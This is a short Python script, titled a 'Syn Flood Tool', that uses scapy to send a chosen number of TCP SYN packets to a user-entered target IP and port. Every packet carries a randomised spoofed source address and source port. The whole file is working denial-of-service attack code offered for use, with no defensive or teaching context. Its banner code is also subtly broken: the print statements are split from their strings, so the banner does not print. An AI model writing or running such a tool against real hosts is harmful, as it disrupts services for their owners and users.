#!/usr/bin/python
# Syn Flood Tool Python

from scapy.all import *
import os
import sys
import random


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def SYN_Flood(dstIP, dstPort, counter):
    for i in range(counter):
        # Build IP packet
        ip_packet = IP(src=randomIP(), dst=dstIP)
        # Build TCP packet
        tcp_packet = TCP(sport=randInt(), dport=dstPort, flags='S')
        # Send the packet
        send(ip_packet / tcp_packet)
        print(f"Packet {i+1} sent")



def info():
    print
    "#############################"
    print
    "# Welcome to SYN Flood Tool #"
    print
    "#############################"

    dstIP = input("\nTarget IP : ")
    dstPort = input("Target Port : ")

    return dstIP, int(dstPort)


def main():
    dstIP, dstPort = info()
    counter = input("How many packets do you want to send : ")
    SYN_Flood(dstIP, dstPort, int(counter))


main()
